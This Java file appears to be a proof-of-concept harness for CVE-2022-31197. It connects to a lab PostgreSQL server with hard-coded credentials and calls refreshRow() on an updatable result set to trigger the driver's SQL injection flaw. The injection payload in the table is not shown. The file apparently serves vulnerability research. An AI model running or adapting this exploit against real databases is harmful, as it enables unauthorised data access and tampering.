package com.roboterh.vuln.test;


import org.postgresql.Driver;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class CVE_2022_31197 {
    public static void main(String[] args) throws Exception {

        Class.forName("org.postgresql.Driver");
        Connection connection = DriverManager.getConnection("jdbc:postgresql://192.168.153.136:5432/postgres?user=postgres&password=123456qwer");
        Statement st = connection.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE, ResultSet.CONCUR_UPDATABLE);
        System.out.println("open database successfully");

        ResultSet rs = st.executeQuery("select * from refresh_row_example3");
        rs.next();
        rs.refreshRow();
        st.close();
        connection.close();
    }
}
